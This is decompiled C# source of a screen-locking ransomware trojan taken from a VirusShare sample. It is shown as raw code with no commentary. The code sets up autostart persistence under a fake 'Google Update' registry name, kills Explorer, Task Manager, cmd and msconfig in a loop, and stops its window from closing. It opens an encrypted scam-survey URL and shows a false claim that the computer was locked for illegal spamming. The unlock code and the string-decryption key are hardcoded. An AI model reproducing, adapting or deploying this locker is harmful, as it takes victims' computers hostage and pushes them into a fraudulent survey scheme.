// Decompiled with JetBrains decompiler
// Type: Survex.Form1
// Assembly: locker, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 61C73F82-3BB4-4834-8011-50537EF0B6E3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.MSIL.Agent.pr-ba9c7dfdfd0c1459e1f1dca57ec1684c80b517dd90e638f595dd187de346d54a.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Survex
{
  public class Form1 : Form
  {
    private Thread end;
    private string encpass = "DOFQYYFPCLFD";
    private IContainer components;
    private PictureBox pictureBox1;
    private Label label1;
    private TextBox textBox1;
    private Button button1;
    private Button button2;

    public Form1() => this.InitializeComponent();

    public static void Main(string[] args) => Application.Run((Form) new Form1());

    private void Form1_Load(object sender, EventArgs e)
    {
      do
      {
        Application.DoEvents();
      }
      while (!Form1.CheckForInternetConnection());
      Thread.Sleep(2000);
      Form1.DKWCR();
      this.OHJLUHZUPLKKYFGVOIVJGVKN();
      Application.DoEvents();
      Process.Start(this.Decrypt("2TT4y/uy+zxWGpQpRFnYgWBcnZMcmikyd+yseGcYeDQ59I8f67HUDklQjv0aFHmQA2Z/orE43rVEbds/jIso2g==", this.encpass));
      Application.DoEvents();
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.pictureBox1.Image = this.getIMG(this.Decrypt("Cm9tGE9QR7IjUtr4+TCIA6cT3iSrNPblWazkyMs5VBnPeyb6/O9X6L+WriMdKaIlWEHVnK6Ozkn31FMtAdyXWg==", this.encpass));
      this.end = new Thread(new ThreadStart(this.EndExplorer));
      this.end.Start();
    }

    [DllImport("user32.dll")]
    public static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);

    private void EndExplorer()
    {
      try
      {
        Form1.PostMessage(Form1.FindWindow("Progman", (string) null), 18U, 0, 0);
        Process.Start("taskkill", "/F /IM explorer.exe");
      }
      catch
      {
      }
      while (true)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName.ToLower() == "taskmgr" || process.ProcessName.ToLower() == "explorer" || process.ProcessName.ToLower() == "cmd" || process.ProcessName.ToLower() == "run" || process.ProcessName.ToLower() == "msconfig" || process.ProcessName.ToLower() == "shutdown")
              process.Kill();
          }
        }
        catch
        {
        }
        Thread.Sleep(1000);
      }
    }

    private void OHJLUHZUPLKKYFGVOIVJGVKN()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(this.Decrypt("OQABwaKFP6X/uBYMCCzNSW1pcLuQL/VRPTfh6vOg0jsuyCxH5lRnQi/y6NmLKrz1Lr5cDOVihDPXR+DnWhom8ahhxs4nbVcPSNZChUjhT0v0yfWg4w7JRBJp4vakQevu", this.encpass), true).SetValue("Google Update", (object) Assembly.GetExecutingAssembly().Location);
      }
      catch
      {
      }
    }

    private static void DKWCR()
    {
      StreamWriter streamWriter = new StreamWriter(Application.LocalUserAppDataPath + "\\GoogleUpdate.bat");
      streamWriter.WriteLine("TASKKILL /F /IM " + Application.ExecutablePath);
      streamWriter.WriteLine("del " + Application.ExecutablePath);
      streamWriter.WriteLine("del " + Application.LocalUserAppDataPath + "\\GoogleUpdate.bat");
      streamWriter.Close();
      Process.Start(new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = Application.LocalUserAppDataPath + "\\GoogleUpdate.bat"
      });
      Application.Exit();
    }

    public Image getIMG(string sURL)
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(sURL);
        httpWebRequest.Method = "GET";
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        Bitmap img = new Bitmap(response.GetResponseStream());
        response.Close();
        return (Image) img;
      }
      catch
      {
        return (Image) null;
      }
    }

    public static bool CheckForInternetConnection()
    {
      try
      {
        new WebClient().DownloadString("http://www.google.com");
        return true;
      }
      catch
      {
        return false;
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private void button2_Click(object sender, EventArgs e) => Process.Start(this.Decrypt("2TT4y/uy+zxWGpQpRFnYgWBcnZMcmikyd+yseGcYeDQ59I8f67HUDklQjv0aFHmQA2Z/orE43rVEbds/jIso2g==", this.encpass));

    private void button1_Click(object sender, EventArgs e)
    {
      if (!(this.textBox1.Text == "wgzjqlolgfpe"))
        return;
      Process.Start("C:\\Windows\\explorer.exe");
      try
      {
        Registry.CurrentUser.OpenSubKey(this.Decrypt("OQABwaKFP6X/uBYMCCzNSW1pcLuQL/VRPTfh6vOg0jsuyCxH5lRnQi/y6NmLKrz1Lr5cDOVihDPXR+DnWhom8ahhxs4nbVcPSNZChUjhT0v0yfWg4w7JRBJp4vakQevu", this.encpass), true).DeleteValue("Google Update");
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    private string Decrypt(string InputText, string Password)
    {
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] buffer = Convert.FromBase64String(InputText);
        byte[] bytes = Encoding.ASCII.GetBytes(Password.Length.ToString());
        PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, bytes);
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(passwordDeriveBytes.GetBytes(16), passwordDeriveBytes.GetBytes(16));
        MemoryStream memoryStream = new MemoryStream(buffer);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
        byte[] numArray = new byte[buffer.Length];
        int count = cryptoStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        cryptoStream.Close();
        return Encoding.Unicode.GetString(numArray, 0, count);
      }
      catch
      {
        return InputText;
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.pictureBox1 = new PictureBox();
      this.label1 = new Label();
      this.textBox1 = new TextBox();
      this.button1 = new Button();
      this.button2 = new Button();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.pictureBox1.Location = new Point(12, 12);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(149, 141);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(167, 12);
      this.label1.Name = "label1";
      this.label1.Size = new Size(190, 91);
      this.label1.TabIndex = 1;
      this.label1.Text = "Your computer is supected of illegal \nspamming and has been locked. To\nunlock your computer, prove you are\na human by filling out a survey. After\nyou complete the survey, a download\nwill give you a txt file containing the\ncode needed to unlock your computer.";
      this.textBox1.Location = new Point(170, 152);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(134, 20);
      this.textBox1.TabIndex = 2;
      this.button1.Location = new Point(310, 150);
      this.button1.Name = "button1";
      this.button1.Size = new Size(51, 23);
      this.button1.TabIndex = 3;
      this.button1.Text = "Unlock";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.button2.Location = new Point(170, 123);
      this.button2.Name = "button2";
      this.button2.Size = new Size(75, 23);
      this.button2.TabIndex = 4;
      this.button2.Text = "Survey";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(373, 184);
      this.ControlBox = false;
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.pictureBox1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Your Computer has been Locked";
      this.TopMost = true;
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
